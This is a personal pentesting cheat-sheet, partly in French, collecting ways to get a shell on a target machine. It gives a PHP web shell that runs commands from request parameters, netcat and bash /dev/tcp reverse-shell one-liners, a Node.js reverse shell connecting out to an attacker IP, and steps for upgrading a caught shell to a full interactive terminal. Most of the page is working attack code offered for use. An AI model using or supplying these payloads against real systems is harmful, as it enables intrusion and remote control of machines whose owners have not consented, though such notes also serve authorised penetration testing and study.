---
description: I'll add way to get shells as i'll use them
---

# Get Shell

* Those lines are to use on the target, on the attacker we'll use `nc -lvpn <port>` to receive the connection.
* Check [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for more example

## PHP

```php
<?php
    system($_REQUEST['cmd']);
?>
```

## Netcat

`nc -e /bin/sh <host> <port>`

## Bash

```bash
# on target
bash -i >& /dev/tcp/<ip>/<port> 0>&1
# des fois il faut l'entourer ainsi
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

* `/dev/tcp` est fournit directement par bash et n'existe que pour les redirections
* `-i` permet de créer un shell interactif
* `>&` Redirige STDOUT et STDERR du shell vers la connection
* `0>&1` Redirige STDIN \(de la co\) vers STDOUT \(de la co je pense\)
* `bash -c` permet de s'assurer que c'est bash et non un autre shell de la machine qui exécutera la commande, c'est nécessaire car /dev/tcp n'est fournit que par lui

## Node

```javascript
(function(){
    var cp = require("child_process");
    var sh = cp.spawn("/bin/sh", []);
    var net = require("net");
    var client = new net.Socket();
    client.connect(my_port, "my_ip", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js app from crashing
})();
```

## Metasploit

* Un shell donné par metasploit ne sera pas forcément persistant, aka tu peux utiliser que des 1 liners parce que l'état n'est pas conservé \(genre un cd te déplacera pas\)

## Upgrade your shell

* Les shells qu'on récupère ainsi sont rarement pratique, ils réagissent mal au tab, n'ont pas d'auto-completion, se ferme avec CTRL-C, etc.
* Pour récupérer un vrai shell. suivre ces étapes : 
  * Sur la victime, spawn un shell via python \(testé avec python3 si le 2 n'est pas dispo\)`python -c 'import pty; pty.spawn("/bin/bash")'`
  * Sur l'attaquant, check notre type de terminal `echo $TERM`
  * Sur la victime, export ces 2 var : `export TERM=...` & `export SHELL=/bin/bash`
  * Ctrl-z sur la victime
  * Ca nous remets sur l'attaquant, check les diffs du terminal avec `stty size`
  * Lancer \(toujours sur l'attaquant\) `stty raw -echo;fg`
  * Taper `reset`
  * Taper `stty rows ... columns ...`

